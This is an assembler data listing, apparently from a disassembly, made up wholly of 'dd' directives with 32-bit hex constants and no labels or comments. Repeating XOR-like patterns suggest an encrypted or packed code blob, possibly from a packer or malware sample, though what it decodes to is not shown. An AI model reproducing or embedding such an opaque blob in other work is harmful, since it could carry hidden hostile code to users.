		dd 2FF1225h, 9B765BB2h,	4462C124h, 7650E3D9h, 0F3DE821h
		dd 4428FD00h, 0FD01F3D9h, 0A37000EFh, 4429E924h, 1505DBD9h
		dd 0EFFDE095h, 10CBB18Dh, 0C924AB3Bh, 0F91E8EBh, 4C62FD00h
		dd 0B9C6F7D9h, 7FE34CBh, 0EF1D5Eh, 0F524A370h, 0DBD94429h
		dd 0E0BF1502h, 0B18DEFFDh, 0AB3B0CCBh, 0E8EEC924h, 0FD000FBFh
		dd 0AFD94C62h, 34CBB9C6h, 1D3407FDh, 0A37600EFh, 0C664D124h
		dd 7464B1A2h, 0EFFD00E2h, 302B7E00h, 0FD49623Eh, 0FFFD6F56h
		dd 10EF927Eh, 0ED0080FFh, 0FFFD6FAFh, 10EF8D1Ah, 0F904EBFDh
		dd 0EBF904EBh, 2EBFC04h, 0F904EBF9h, 7FFE04EBh,	4CBB98Bh
		dd 0B33BFABh, 8B551510h, 0C06AED01h, 0BD8BE289h, 6AFD8BE3h
		dd 8BEB89C0h, 76C3B1FDh, 7F3E5E29h, 907F6D90h, 6D907F6Dh
		dd 7F6D907Fh, 137BDA1h,	0BD0462EDh, 627D0462h, 4627D04h
		dd 7D04627Dh, 0BFF8E02Eh, 6113E8FFh, 0F8C7FFFCh, 0FFFCD8A7h
		dd 0EFFD01h, 6D907F3Eh,	7F6D907Fh, 56FF1183h, 0FC6AEF97h
		dd 0FA020285h, 10EE99A4h, 3831F76h, 0E4FA7510h,	0C46CA3C0h
		dd 76572CEDh, 0B8E12493h, 0FF108AE8h, 0F9C46C02h, 0E888C06Ah
		dd 8CFA0257h, 7410EE99h, 64F124ABh, 50CFD944h, 0D944289Bh
		dd 10FD02E3h, 18B5115h,	0D94C62EDh, 0BEED6AE7h,	44669B56h
		dd 0E8FFF9D9h, 0FFFC645Fh, 5F100583h, 256E088h,	0EE9998FAh
		dd 0FF277E10h, 0EDC46CA3h, 0B13B8B2Ch, 0C3FF3983h, 6D907F6Dh
		dd 0EDA1EC6Eh, 55BCFD00h, 0AADBDCABh, 63E8FFBCh, 50FFFC62h
		dd 9FB8FA02h, 2B7E10EEh, 246B7008h, 0FD00EF21h,	0EDFF68BFh
		dd 1510FD00h, 0ED018B3Dh, 33B11564h, 0D64ED01h,	0ED0133B5h
		dd 0EE21504Eh, 0EE4010h, 7455EFFDh, 0BCAD24BBh,	89BC2F33h
		dd 9B54CBB1h, 33A90D64h, 0FF87ED01h, 7400EFFDh,	859B24BBh
		dd 89ED9703h, 9B68CBB9h, 83D94C66h, 24BB7466h, 7D15108Fh
		dd 64ED018Bh, 0FF117EF0h, 0C1249B74h, 0ED2084E0h, 3D64FD00h
		dd 0ED018B49h, 0AFD94462h, 6ABFF96Ah, 7456BCFFh, 10A92483h
		dd 0FF177ED7h, 0FFBD6BF2h, 0A37000EFh, 485B924h, 0ED0587ACh
		dd 109500EFh, 56EFFDFFh, 0A524AB3Ah, 0EFFD1367h, 0F86C2AFFh
		dd 6584E002h, 89FD00EDh, 0D8D3E88Bh, 0C88BFFFCh, 0FFFC6463h
		dd 137E168h, 0B9C789EDh, 0EFFF6CCBh, 24BB7466h,	76D61093h
		dd 0EE99ACD2h, 89C79710h, 3B70CBB9h, 0AAE924ABh, 15CBA188h
		dd 74663802h, 64E92483h, 18D152Dh, 0B98989EDh, 289B12CBh
		dd 40F9D944h, 0D8D510FDh, 6FFD0010h, 0DA7FA79h,	2FF10FDh
		dd 0CBB988AFh, 24AB7018h, 0B9C6BFB5h, 89FB1DCBh, 1ECBA189h
		dd 0E1683902h, 64ED0137h, 8CFA02F0h, 7410EE99h,	10DD24ABh
		dd 605664D5h, 0A00EF17h, 10AF4216h, 15649BD7h, 0ED0137C1h
		dd 0CBB98989h, 0D710AF24h, 0D944669Bh, 7628FFC9h, 0A406FDB9h
		dd 0BFF918C8h, 6BE8FFBDh, 68FFFC64h, 0FD00EDFDh, 0C3D94466h
		dd 30CBA189h, 0C924AB3Bh, 0CBB9C6BFh, 0D710FF35h, 7466FB97h
		dd 89CB24ABh, 38CBA189h, 0D95C669Bh, 0CB8989D5h, 24B37560h
		dd 0D9442995h, 38020686h, 24AB7466h, 0B53D6C9Bh, 0EEED0137h
		dd 161790Fh, 0B9C7EFFDh, 0C7FD38CBh, 604FD00h, 99ACD276h
		dd 3A0210EEh, 154499h, 4F7EFFDh, 3A0252ADh, 154499h, 4F7EFFDh
		dd 3A0252ADh, 154499h, 4F7EFFDh, 3A0252ADh, 154499h, 4F7EFFDh
		dd 0BB7052ADh, 3C87A524h, 0AF10EE21h, 8CB11510h, 0C46CED01h
		dd 0A18989E5h, 3A021ACBh, 0EF0225h, 0B507967Dh,	100200E2h
		dd 4467BDFFh, 0B98DF7D9h, 10AD48CBh, 18B7115h, 9BF064EDh
		dd 0DBD95C66h, 1CCB8989h, 44993A02h, 0EFFDEA8Fh, 52AD04F7h
		dd 74663802h, 10D924ABh, 5664D5h, 0A354B14h, 10AF4216h
		dd 18B7915h, 0D95464EDh, 0CBB989CFh, 24AB7628h,	0D9746699h
		dd 0EFF8B997h, 7462FD00h, 418DCBD9h, 0EFFD84CBh, 24BB7400h
		dd 0D9846681h, 0EFFD006Fh, 0A51CDD6Ah, 8124A370h, 17A3E8BEh
		dd 55602FFh, 7000EFFDh,	62E5249Bh, 6FD9BCh, 698DEFFDh
		dd 0EFFD80CBh, 0B94A0E00h, 0FD00EFF8h, 0C3D97462h, 94CB418Dh
		dd 9B00EFFDh, 0D3D94466h, 0F3BDD56Ah, 0D99C6658h, 0EFFD005Fh
		dd 0FF17E2E8h, 0FD055602h, 9B7000EFh, 0BC62DD24h, 0FD0067D9h
		dd 0AB7466EFh, 5464D724h, 3983A3D9h, 5658F3FFh,	0EFFD05h
		dd 0D9249B70h, 63D9BC62h, 8DEFFD00h, 0E68CBB9h,	0BFED6A4Ah
		dd 24637053h, 0FD00EF79h, 0BDAC2885h, 6467E8FFh, 0B98BFFFCh
		dd 66B538CBh, 0FD7D944h, 2FE7C78h, 37B9A110h, 0FFBFED01h
		dd 0FC6113E8h, 43C08BFFh, 0E9FFFC64h, 2FF1198h,	0BE8FFBCh
		dd 5FFFFC60h, 7C5BB2A3h, 0EFFF5C2Bh, 907F3E00h,	6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 818BB8ABh, 10AA0CCBh, 18B7115h
		dd 2F86CEDh, 10AA509Ah,	18B5515h, 89C06AEDh, 0A7420F8Ah
		dd 0CAF760Ah, 818D3E76h, 0DF760CCBh, 0F3ED14C1h, 7ECA6458h
		dd 4B0E030Eh, 0CCBB98Bh, 811510ADh, 64ED018Bh, 0FF267EF8h
		dd 53F22FCEh, 16D6D118h, 0F7642C8Bh, 0FCD8F342h, 0ED14C1FFh
		dd 0CA6458F3h, 3483F416h, 1D3D3310h, 2B3E0AAEh,	76C16404h
		dd 37E1BF18h, 0E92EED01h, 76A51CFFh, 0EC1C8327h, 3D6C59F3h
		dd 0ED0137B5h, 64987410h, 8BF7D974h, 0FC6177C0h, 280B85FFh
		dd 137B505h, 2FF10EDh, 0C7F8C710h, 0FFFCEEh, 8300EFFDh
		dd 85FD6AC6h, 68EF9700h, 0ED009E0Dh, 0EF970085h, 0D642AFFh
		dd 0ED0101D5h, 0F7700466h, 41FFFCEAh, 0F08921C6h, 0FFFCEEC7h
		dd 404E2A7Ch, 7810EE25h, 85EC742Fh, 6AEF9700h, 8C4087FDh
		dd 0EF9710EFh, 0D710FD6Ah, 6DC3B1A2h, 7F6D907Fh, 907F6D90h
		dd 6D907F6Dh, 0EFECA457h, 0D8291500h, 7055EFFDh, 0B9DD24ABh
		dd 2ED9550h, 0E8FFEFFDh, 0FFFC642Fh, 85FC6Ah, 0FC6AEF97h
		dd 0EFFD0251h, 56EC9700h, 9980FA02h, 77610EEh, 0F100083h
		dd 0FD000E79h, 87F96AEFh, 10EE2540h, 0FD10EA95h, 100268EFh
		dd 0FFBAFD00h, 0FC645BE8h, 100583FFh, 2F790Fh, 0AA53EFFDh
		dd 0EE251C87h, 74669B10h, 0E8FFCFD9h, 0FFFC6463h, 20CBB989h
		dd 0EC24AB3Bh, 9B7466EFh, 0C789E924h, 0FD12CBB9h, 0AB3A66EFh
		dd 2EFEB24h, 0ED24AB3Bh, 5BE8FFE7h, 8BFFFC61h, 7610CBB1h
		dd 64E924BBh, 18D151Dh,	0D98C66EDh, 0EFFD0153h,	0C0CB6989h
		dd 7400EFFCh, 0EE39246Bh, 3D6CFD00h, 0ED0137B5h, 51AC74EEh
		dd 0EFFD0Fh, 2253C02h, 967D00EEh, 0E2B507h, 0BDFF1003h
		dd 5370C865h, 0EE3524h,	76E965FDh, 0FF1DC12Eh, 0B92E7666h
		dd 0FD00EC03h, 9A56F3A1h, 24BB70D3h, 0AF1085E1h, 6B700085h
		dd 0EE3524h, 0ED0487FDh, 0BAAD00EFh, 6467E8FFh,	5BEBFFFCh
		dd 0FA020085h, 10EE9DE4h, 0A05EB4A2h, 0FE59C46Eh, 902CFD00h
		dd 6D907F6Dh, 7F6D907Fh, 7C64AA56h, 257E3D9h, 0EE998CFAh
		dd 0FF177E10h, 257BF88h, 0EE99A8FAh, 742F7810h,	0B5BFE098h
		dd 0E3BD8BE5h, 7C622C8Bh, 0CD8BE3D9h, 1CFFE92Eh, 832576A5h
		dd 59F3EC1Ch, 0E3D94464h, 7CFA0250h, 7610EE99h,	10348317h
		dd 0AE1D3D33h, 42B3E0Ah, 1876D164h, 137E1BFh, 0FFE92EEDh
		dd 2576A51Ch, 0C96CE6EBh, 0FC0DC02h, 0C42CF741h, 8B2E76F9h
		dd 251C500Ah, 63C10EEh,	8B4A0E02h, 0FEE16C35h, 0A75CA41Ch
		dd 8BFFFCD8h, 7610CBB1h, 6CE924BBh, 0D6602F8h, 0ED0137C1h
		dd 37BD1566h, 659BED01h, 0E5249B76h, 8E653D64h,	0F66AED01h
		dd 2548EA3Ah, 100210EEh, 52802FFh, 0ED0101D5h, 0EFFD00EFh
		dd 85D47Eh, 0FD6AEF97h,	0EF8B7087h, 6AEF9710h, 76D710FDh
		dd 0EE1328E2h, 8DEB7410h, 0ED0105E5h, 66333BAEh, 101D50Dh
		dd 5CD793EDh, 0FFFCD8AFh, 119B3D85h, 0FD6AEF97h, 0AF950085h
		dd 6AFFFD71h, 20085FDh,	2CA35F38h, 907F6D90h, 6D907F6Dh
		dd 0EFED1457h, 0D6691500h, 0A853EFFDh, 8D152D64h, 57B9ED01h
		dd 2253A02h, 967D00EEh,	0E2B507h, 0BDFF1003h, 9370C865h
		dd 0E965D524h, 0FCD8F395h, 893C8BFFh, 1CCBB9C7h, 1DC1EFFFh
		dd 2E7666FFh, 0EC02B9h,	70AB1CFDh, 6CD12493h, 0C0DC02C9h
		dd 2CF7410Fh, 0CBB189A6h, 8CFA0214h, 9B10EE99h,	37C11564h
		dd 4466ED01h, 252F3D9h,	0EE99ACFAh, 6AEF9710h, 9B0285FFh
		dd 0C9D94466h, 644BE8FFh, 258BFFFCh, 0FBD94462h, 68BFF96Ah
		dd 0FD00FFFCh, 0EF02FF87h, 4428AE00h, 0FD00C7D9h, 0FA0200EFh
		dd 10EE99B4h, 2548D27Eh, 9BFC10EEh, 0E34358h, 28FFEFFDh
		dd 0EFFCFFCAh, 48E88480h, 2FEEFF0h, 27774010h, 28CB818Dh
		dd 3C8B0677h, 89EDE02Eh, 0FF563C8Bh, 0B300EFFEh, 3988AB1Ch
		dd 10CBB98Bh, 0E524BB70h, 85AF1085h, 24A37000h,	0AE51BFC9h
		dd 8B751510h, 1564ED01h, 0ED0137B9h, 13E8FFBDh,	0EBFFFC61h
		dd 2008562h, 0EE9DE4FAh, 5DB1A210h, 6D907FA6h, 7F6D907Fh
		dd 907F6D90h, 6D907F6Dh, 937657B9h, 0FFB8F124h,	0FC6463E8h
		dd 100583FFh, 0FFB8AD75h, 0FC6447E8h, 9B3D85FFh, 4850F265h
		dd 0F14064F7h, 9370D164h, 3064F124h, 0E02063Ch,	6C378B4Ah
		dd 0A41CFEE1h, 0F124AB76h, 93E8FFBFh, 8BFFFC64h, 2C96C05h
		dd 410FC0DCh, 0F9C42CF7h, 0A8B3E76h, 0EE251C50h, 2063C10h
		dd 378B4A0Eh, 267E1B04h, 0F22FCEFFh, 0D6D11853h, 643C8B16h
		dd 0D8F342F7h, 14C1FFFCh, 6458F3EDh, 30E7EC8h, 898B4B0Eh
		dd 0A37618CBh, 5464ED24h, 0C08BFBD9h, 0FFFC6177h, 0D660B85h
		dd 0ED0137C1h, 37BD1566h, 528ED01h, 0ED0137B5h,	1002FF10h
		dd 0EEC7F8C7h, 0FD00FFFCh, 0C68300EFh, 85FD6Ah,	4D68EF97h
		dd 85ED0097h, 0FFEF9700h, 0D50D642Ah, 66ED0101h, 0EAF77004h
		dd 0C641FFFCh, 0C7F08921h, 7CFFFCEEh, 25404E2Ah, 2F7810EEh
		dd 85EC74h, 0FD6AEF97h,	0EF8C4087h, 6AEF9710h, 0A2D710FDh
		dd 7F6DC3B1h, 14B1181h,	0B98DEFFDh, 0B9AE14CBh,	287AD57h
		dd 200EFFFh, 0EE99C0FAh, 6AEF9710h, 970085FDh, 85FE6AFEh
		dd 80FA0202h, 7610EE99h, 10068337h, 4C62D074h, 0F96AE3D9h
		dd 85FF6ABEh, 4428AE00h, 0FD01CFD9h, 0FA0200EFh, 10EE99B4h
		dd 88FF177Eh, 33A568F7h, 1510ED01h, 0ED018D4Dh,	0B0F9C46Ch
		dd 0C46EA65Eh, 0FD00EE59h, 0FA76662Ch, 10EE253Ch, 0D944289Bh
		dd 0BDFD02FFh, 6443E8FFh, 0E168FFFCh, 89ED0137h, 16CBB989h
		dd 998CFA02h, 177E10EEh, 24AB74FFh, 95339AE9h, 0FFFCD8F3h
		dd 6447E8FFh, 3D85FFFCh, 50F2B99Bh, 5064F748h, 0D97C62F1h
		dd 64CF8BFBh, 2063CD1h,	378B4A0Eh, 1CFEE16Ch, 40649BA4h
		dd 0B98989F5h, 0D27E10CBh, 10EE2548h, 763F9BFCh, 0EE9988D2h
		dd 2D64A810h, 0ED018E01h, 0EFFD0C51h, 3CFA7600h, 7010EE01h
		dd 85E924A3h, 85AC10h, 0EEC87AFh, 10AE10EEh, 0E59AB3D7h
		dd 0FCD8AB5Ch, 3A0250FFh, 0D8A7C083h, 8801FFFCh, 0EF975D20h
		dd 600BE8FFh, 6D90FFFCh, 7F6D907Fh, 52F1181h, 0A853EFFDh
		dd 0B81033B9h, 8CFA0255h
		dd 0AD10EE9Fh, 8D451510h, 3564ED01h, 0ED018D15h, 10F5C46Ch
		dd 813776D6h, 0FD01101Eh, 0A4F5796Fh, 0FEEF3681h, 70431002h
		dd 0BFBD24ABh, 0EDFF68h, 3D1510FDh, 0DCED018Bh,	893DCEC9h
		dd 3B19CBB1h, 0EFE524ABh, 1DCBB189h, 0E524BB74h, 0CED94C66h
		dd 1CCBA989h, 0D824A374h, 0CFD95466h, 24A37466h, 0D95466D4h
		dd 0CBB188CBh, 892C772Bh, 7728CBA9h, 560F8A3Fh,	0EFFC00h
		dd 418D2D76h, 0EFFCD0CBh, 100F3C00h, 3AC2649Bh,	0EE013CEAh
		dd 0EBE110h, 2AB1CFDh, 15449939h, 0F7EFFD00h, 252AD04h
		dd 15449939h, 0F7EFFD00h, 252AD04h, 15449939h, 0F7EFFD00h
		dd 252AD04h, 15449939h,	0F7EFFD00h, 7052AD04h, 87D524BBh
		dd 10EE213Ch, 0B11510AFh, 89ED018Ch, 113C1A1h, 513D64EDh
		dd 6CED018Bh, 4429E5C4h, 3B45C3D9h, 0EFD024ABh,	8B380250h
		dd 0FC6463E0h, 37E168FFh, 8989ED01h, 9B32CBB9h,	0DBD96C66h
		dd 24837466h, 0D94429CBh, 0AB3B80D7h, 66FEC424h, 0C7248374h
		dd 776D310h, 3CCB9189h,	44993902h, 0EFFDEA8Fh, 52AD04F7h
		dd 76663802h, 0EE253CFAh, 44669B10h, 252FFD9h, 0EBF56838h
		dd 8989FD00h, 216CBB9h,	1F766638h, 18CBB98Dh, 898989ADh
		dd 3C0218CBh, 10CBA18Bh, 0F2B93F76h, 0DCFD00EEh, 0F30342C0h
		dd 7466FFFCh, 1CEB24ABh, 24A376ABh, 0C88989E9h,	0FFFCF319h
		dd 0F313F089h, 0FDB9FFFCh, 62FD00EEh, 13FD9B4h,	0FDBFEFFDh
		dd 66ED011Bh, 11C1115h,	0D2D66EDh, 29ED011Ch, 11C0805h
		dd 0E089FEEDh, 0FFFCF317h, 0EBE968h, 0EEC87FDh,	4A0E10EEh
		dd 40CBA989h, 2EFD015h,	0EFF8B910h, 7462FD00h, 11BFDBD9h
		dd 89ED011Ch, 1ECBB989h, 0E124BB76h, 1CF5C46Ch,	1EF44A5h
		dd 498DEFFDh, 0EFFCD0CBh, 0F4E74200h, 0E089FFFCh, 0FFFCF4EFh
		dd 0F4EBE889h, 58F3FFFCh, 0B4A05EB0h, 52F3981h,	6DC3EFFDh
		dd 7F6D907Fh, 907F6D90h, 818BB8ABh, 10AA0CCBh, 18B7115h
		dd 2F86CEDh, 10AA509Ah,	18B5515h, 89C06AEDh, 0A7420F8Ah
		dd 0CAF760Ah, 818D3E76h, 0DF760CCBh, 0F3ED14C1h, 7ECA6458h
		dd 4B0E030Eh, 0CCBB98Bh, 811510ADh, 64ED018Bh, 0FF267EF8h
		dd 53F22FCEh, 16D6D118h, 0F7642C8Bh, 0FCD8F342h, 0ED14C1FFh
		dd 0CA6458F3h, 3483F416h, 1D3D3310h, 2B3E0AAEh,	76C16404h
		dd 37E1BF18h, 0E92EED01h, 76A51CFFh, 0EC1C8327h, 4C6459F3h
		dd 0A98BFFD9h, 0E27414CBh, 10EE253Ch, 2540FA74h, 0EA3A10EEh
		dd 10EE2548h, 2FF1002h,	10003B07h, 249B76FFh, 653D64E5h
		dd 6AED018Eh, 28EA3AF6h, 0FD10EE13h, 91FD00EFh,	6AEF9729h
		dd 950085FDh, 0FFFD7A3Fh, 85FD6Ah, 0F08B3802h, 0FFFCEEC7h
		dd 1862F989h, 0BC10EE17h, 0E274CED4h, 10EE1328h, 0BDA13881h
		dd 6AED0137h, 6AFE89C0h, 970085FDh, 9EBD68EFh, 85ED00h
		dd 2AFFEF97h, 7F3E5EB0h, 907F6D90h, 6D907F6Dh, 7F6D907Fh
		dd 53FB1183h, 4257B9A8h, 0FFFCEEC3h, 33103483h,	251C873Dh
		dd 410F10EEh, 66A62CF7h, 0E524AB3Ah, 367600EDh,	6463E8FFh
		dd 0B989FFFCh, 4E9B18CBh, 10EE253Ch, 511510ADh,	85ED018Bh
		dd 6AED9700h, 0B98989FFh, 0FA0222CBh, 10EE99A4h, 0ED24A370h
		dd 64AC0485h, 10EE95F8h, 268EFFDh, 0B8FD0010h, 24CBB9C7h
		dd 0FD00EFFDh, 8B491510h, 2D64ED01h, 0ED018B75h, 37B53D6Ch
		dd 74EEED01h, 0FD0C51D5h, 0BB7000EFh, 1085E924h, 0AE0085AFh
		dd 0EE132C87h, 0D510AA10h, 5CEB9AB3h, 0FFFCD8ABh, 0FCFA0250h
		dd 1610EE9Ch, 10FD6A20h, 18F1915h, 0A05EB0EDh, 7F6D90B4h
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 7C64AA56h, 257E3D9h
		dd 0EE998CFAh, 0FF177E10h, 257BF88h, 0EE99A8FAh, 742F7810h
		dd 0B5BFE098h, 0E3BD8BE5h, 7C622C8Bh, 0CD8BE3D9h, 1CFFE92Eh
		dd 832576A5h, 59F3EC1Ch, 0E3D94464h, 7CFA0250h,	7610EE99h
		dd 10348317h, 0AE1D3D33h, 42B3E0Ah, 1876D164h, 137E1BFh
		dd 0FFE92EEDh, 2576A51Ch, 0C96CE6EBh, 0FC0DC02h, 0C42CF741h
		dd 8B2E76F9h, 251C500Ah, 63C10EEh, 8B4A0E02h, 0FEE16C35h
		dd 0A376A41Ch, 5464E924h, 0F089F7D9h, 0FFFCD8D3h, 0EFBDB9h
		dd 42C0DCFDh, 0FFFCEEC3h, 7C6456F3h, 3483FFD9h,	0AFE88910h
		dd 0F2FFFCD8h, 0D6D11853h, 643C8B16h, 0EEC342F7h, 14C1FFFCh
		dd 6458F3EDh, 30E7EC8h,	898B4B0Eh, 0D2761CCBh, 10EE9C98h
		dd 0F8C71978h, 0FFFCD8A7h, 0FF1002FFh, 1328EA3Ah, 0EFFD10EEh
		dd 2991FD00h, 0FD6AEF97h, 0CF950085h, 6AFFFD7Fh, 20085FDh
		dd 0C7F08B38h, 89FFFCEEh, 171862F9h, 0D4BC10EEh, 28E274CEh
		dd 8110EE13h, 37BDA138h, 0C06AED01h, 0FD6AFE89h, 0EF970085h
		dd 9EBD68h, 970085EDh, 0B02AFFEFh, 907F3E5Eh, 5C1C037Eh
		dd 0FFFCDC83h, 0DC9FF08Ah, 0AA53FFFCh, 0E3D94466h, 10CBB188h
		dd 0F1249370h, 0DC02C96Ch, 0D8F395C0h, 53F2FFFCh, 89B4D118h
		dd 18CBB9C7h, 248BEFFFh, 8B711510h, 8B89ED01h, 0FCD8D3E8h
		dd 0CBB989FFh, 1510AF18h, 0ED018B51h, 0ED970085h, 8989FF6Ah
		dd 222CBB9h, 0EE99A4FAh, 8D177610h, 9708CBB9h, 0EE9550EBh
		dd 68EFFD10h, 0FD001002h, 0CBB9C7B8h, 0EFFD1Ch,	491510FDh
		dd 6CED018Bh, 137B53Dh,	0C474EEEDh, 67D08BBAh, 56FFFC64h
		dd 0FD00E343h, 0CBB18DEFh, 51FF971Ch, 0A98DEF97h, 0BDAE20CBh
		dd 4E3A0257h, 0B9A10488h, 0BFED0137h, 6113E8FFh, 0C083FFFCh
		dd 0FFFCD8A7h, 5E3E8801h, 20085A0h, 0EE9DE4FAh,	90B4A210h
		dd 6D907F6Dh, 937657B9h, 0FFB8F124h, 0FC6463E8h, 100583FFh
		dd 0FFB8AD75h, 0FC6447E8h, 9B3D85FFh, 4850F265h, 0F14064F7h
		dd 9370D164h, 3064F124h, 0E02063Ch, 6C378B4Ah, 0A41CFEE1h
		dd 0F124AB76h, 93E8FFBFh, 8BFFFC64h, 2C96C05h, 410FC0DCh
		dd 0F9C42CF7h, 0A8B3E76h, 0EE251C50h, 2063C10h,	378B4A0Eh
		dd 267E1B04h, 0F22FCEFFh, 0D6D11853h, 643C8B16h, 0D8F342F7h
		dd 14C1FFFCh, 6458F3EDh, 30E7EC8h, 898B4B0Eh, 0A37618CBh
		dd 5464ED24h, 0C08BFBD9h, 0FFFC6177h, 0D660B85h, 0ED0137C1h
		dd 37BD1566h, 528ED01h,	0ED0137B5h, 1002FF10h, 0EEC7F8C7h
		dd 0FD00FFFCh, 0C68300EFh, 85FD6Ah, 0ED68EF97h,	85ED006Eh
		dd 0FFEF9700h, 0D50D642Ah, 66ED0101h, 0EAF77004h, 0C641FFFCh
		dd 0C7F08921h, 7CFFFCEEh, 25404E2Ah, 2F7810EEh,	85EC74h
		dd 0FD6AEF97h, 0EF8C4087h, 6AEF9710h, 0A2D710FDh, 7F6DC3B1h
		dd 54F1181h, 0B98DEFFDh, 0BFAB10CBh, 0EDFF68h, 3D1510FDh
		dd 89ED018Bh, 0D8D3E88Bh, 3433FFFCh, 0EBD94C66h, 24A37452h
		dd 0B9C789F1h, 0EFFF08CBh, 10CBB189h, 0E924A374h, 8B511510h
		dd 1C87ED01h, 9B10EE25h, 0E5D94466h, 6463E8FFh,	0FB6AFFFCh
		dd 0ED970185h, 14CBB989h, 99A4FA02h, 1F7610EEh,	4CBB98Dh
		dd 0AB50FF97h, 8B4D1510h, 0F86CED01h, 0AB0F9A02h, 8B651510h
		dd 81B1ED01h, 0FD054F39h, 64AEC3EFh, 18D151Dh, 0D08BBAEDh
		dd 0FFFC647Fh, 48D27E57h, 0FC10EE25h, 3C024A9Bh, 0EE0225h
		dd 0B507967Dh, 100300E2h, 0C865BDFFh, 148AEF97h, 5BD99462h
		dd 8BEFFD01h, 0D9BC623Ch, 0EFFD015Bh, 66FF1DC1h, 0FDB92E76h
		dd 87FD00EEh, 0EFF900h,	0ABAB1CAFh, 0AB5CD510h,	50FFFCD8h
		dd 9CFCFA02h, 421610EEh, 1510FC6Ah, 0ED018F19h,	7FA65DB0h
		dd 7C64AA56h, 257E3D9h,	0EE998CFAh, 0FF177E10h,	257BF88h
		dd 0EE99A8FAh, 742F7810h, 0B5BFE098h, 0E3BD8BE5h, 7C622C8Bh
		dd 0CD8BE3D9h, 1CFFE92Eh
		dd 832576A5h, 59F3EC1Ch, 0E3D94464h, 7CFA0250h,	7610EE99h
		dd 10348317h, 0AE1D3D33h, 42B3E0Ah, 1876D164h, 137E1BFh
		dd 0FFE92EEDh, 2576A51Ch, 0C96CE6EBh, 0FC0DC02h, 0C42CF741h
		dd 8B2E76F9h, 251C500Ah, 63C10EEh, 8B4A0E02h, 0FEE16C35h
		dd 0A75CA41Ch, 8BFFFCD8h, 7E14CBB1h, 0E274FF17h, 10EE2540h
		dd 898B8A89h, 0D27618CBh, 10EE9C98h, 0F8C71978h, 0FFFCD8A7h
		dd 0FF1002FFh, 1328EA3Ah, 0EFFD10EEh, 2991FD00h, 0FD6AEF97h
		dd 0F950085h, 6AFFFD82h, 20085FDh, 0C7F08B38h, 89FFFCEEh
		dd 171862F9h, 0D4BC10EEh, 28E274CEh, 8110EE13h,	37BDA138h
		dd 0C06AED01h, 0FD6AFE89h, 0EF970085h, 9EBD68h,	970085EDh
		dd 0B02AFFEFh, 907F3E5Eh, 0FCA0037Ch, 0BAAE00EFh, 24AB7056h
		dd 9550B8E1h, 0EFFD02EDh, 642FE8FFh, 7666FFFCh,	0EE253CFAh
		dd 8926CE10h, 0AF10CBB1h, 0F7D94C66h, 24AB3A66h, 7400EDE9h
		dd 66E124A3h, 0FFCFD94Ch, 0FC6443E8h, 37E168FFh, 8989ED01h
		dd 216CBB9h, 0EE998CFAh, 0A4F27610h, 7610EE99h,	0EE99B0C2h
		dd 24AB7410h, 0B53D6CE9h, 0EEED0137h, 85CB74h, 0FF6AEE97h
		dd 1F76D310h, 0EBFDBFh,	0D94462FDh, 0BFED6AFFh,	853A0256h
		dd 0AB079A3Dh, 8B651510h, 75A0ED01h, 0B90D6415h, 0BEED0137h
		dd 6113E8FFh, 3CEBFFFCh, 0FA020185h, 10EE9DE4h,	0A65DB1A2h
		dd 7F6D907Fh, 7C64AA56h, 257E3D9h, 0EE998CFAh, 0FF177E10h
		dd 257BF88h, 0EE99A8FAh, 742F7810h, 0B5BFE098h,	0E3BD8BE5h
		dd 7C622C8Bh, 0CD8BE3D9h, 1CFFE92Eh, 832576A5h,	59F3EC1Ch
		dd 0E3D94464h, 7CFA0250h, 7610EE99h, 10348317h,	0AE1D3D33h
		dd 42B3E0Ah, 1876D164h,	137E1BFh, 0FFE92EEDh, 2576A51Ch
		dd 0C96CE6EBh, 0FC0DC02h, 0C42CF741h, 8B2E76F9h, 251C500Ah
		dd 63C10EEh, 8B4A0E02h,	0FEE16C35h, 0A75CA41Ch,	8BFFFCD8h
		dd 7E14CBB1h, 0E274FF17h, 10EE2540h, 898B8A89h,	0D27618CBh
		dd 10EE9C98h, 0F8C71978h, 0FFFCD8A7h, 0FF1002FFh, 1328EA3Ah
		dd 0EFFD10EEh, 2991FD00h, 0FD6AEF97h, 3F950085h, 6AFFFD84h
		dd 20085FDh, 0C7F08B38h, 89FFFCEEh, 171862F9h, 0D4BC10EEh
		dd 28E274CEh, 8110EE13h, 37B9A138h, 0C06AED01h,	0FD6AFE89h
		dd 0EF970085h, 9EBD68h,	970085EDh, 0B02AFFEFh, 907F3E5Eh
		dd 65681097h, 8BED01BBh, 0EFFDA1h, 7464BFFDh, 0EFFD00CAh
		dd 55BCAC00h, 0B18DB8ABh, 0B21510CBh, 68EFFDCAh, 0ED0101D1h
		dd 0FBD94C62h, 20CBB9C7h, 0FD00EFFDh, 0EF376B07h, 90D27600h
		dd 7610EE99h, 0EE9998F2h, 0FCC27610h, 7E10EE9Ch, 0EE2548D2h
		dd 2C9BFC10h, 0FCD8D35Ch, 0F39550FFh, 0E8FFFCD8h, 2FF0571h
		dd 0AB76F064h, 0C46CE524h, 54864F5h, 0BFAC0085h, 56380256h
		dd 0F86A3C02h, 2416D510h, 1510FD6Ah, 0ED018F19h, 0B4A05EB0h
		dd 907F6D90h, 818BB8ABh, 0B440CCBh, 57FFFCF3h, 0FDCAEC15h
		dd 0FA0257EFh, 10EE998Ch, 88FF177Eh, 0FA0257BFh, 10EE99A8h
		dd 98742F78h, 0E5B5BFE0h, 8BE3BD8Bh, 0D97C622Ch, 2ECD8BE3h
		dd 0A51CFFE9h, 1C832576h, 6459F3ECh, 50E3D944h,	997CFA02h
		dd 177610EEh, 33103483h, 0AAE1D3Dh, 64042B3Eh, 0BF1876D1h
		dd 0ED0137E1h, 1CFFE92Eh, 0EB2576A5h, 2C96CE6h,	410FC0DCh
		dd 0F9C42CF7h, 0A8B2E76h, 0EE251C50h, 2063C10h,	358B4A0Eh
		dd 1CFEE16Ch, 24BB76A4h, 0FD4056E5h, 2FCE00EFh,	101D1BFh
		dd 76AB1CEDh, 64E924A3h, 89FFD97Ch, 0FCD8D3F0h,	103483FFh
		dd 0D8AFE889h, 53F2FFFCh, 16D6D118h, 0F7643C8Bh, 0FCEEC342h
		dd 0ED14C1FFh, 0C86458F3h, 0E030E7Eh, 0CB898B4Bh, 98D2761Ch
		dd 7810EE9Ch, 0A7F8C719h, 0FFFFFCD8h, 3AFF1002h, 0EE1328EAh
		dd 0EFFD10h, 972991FDh,	85FD6AEFh, 866F9500h, 0FD6AFFFDh
		dd 38020085h, 0EEC7F08Bh, 0F989FFFCh, 0EE171862h, 0CED4BC10h
